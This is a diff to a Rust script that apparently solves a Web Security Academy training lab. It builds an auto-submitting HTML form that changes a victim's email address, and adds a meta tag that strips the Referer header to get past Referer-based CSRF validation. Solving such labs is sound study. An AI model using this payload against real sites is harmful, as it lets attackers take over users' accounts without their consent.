@@ -1,16 +1,17 @@
-/*******************************************************************************************
+/***********************************************************************************
 *
 * Author: Ahmed Elqalawy (@elqal3awii)
 *
 * Date: 21/10/2023
 *
-* Lab: CSRF vulnerability with no defenses
+* Lab: CSRF where Referer validation depends on header being present
 *
-* Steps: 1. Craft an HTML form for changing the email address with an auto-submit script
+* Steps: 1. Craft an HTML form for changing the email address with an auto-submit 
+*           script and a meta tag that drops the Referer header from the request
 *        2. Deliver the exploit to the victim
 *        3. The victim's email will be changed after he trigger the exploit
 *
-********************************************************************************************/
+************************************************************************************/
 #![allow(unused)]
 /***********
 * Imports
@@ -32,10 +33,10 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let lab_url = "https://0ac20097049135328067b7e10022005a.web-security-academy.net";
+    let lab_url = "https://0aac003c04f9f9dd80a167a300bc00d4.web-security-academy.net";
 
     // change this to your exploit server URL
-    let exploit_server_url = "https://exploit-0a540083047b35948098b6ac01ff0077.exploit-server.net";
+    let exploit_server_url = "https://exploit-0a6e0034049af9328035666701cc0039.exploit-server.net";
 
     // build the client that will be used for all subsequent requests
     let client = build_client();
@@ -51,6 +52,7 @@ fn main() {
     let payload = format!(
         r###"<html>
                 <body>
+                <meta name="referrer" content="never">
                 <form action="{lab_url}/my-account/change-email" method="POST">
                     <input type="hidden" name="email" value="{new_email}" />
                     <input type="submit" value="Submit request" />
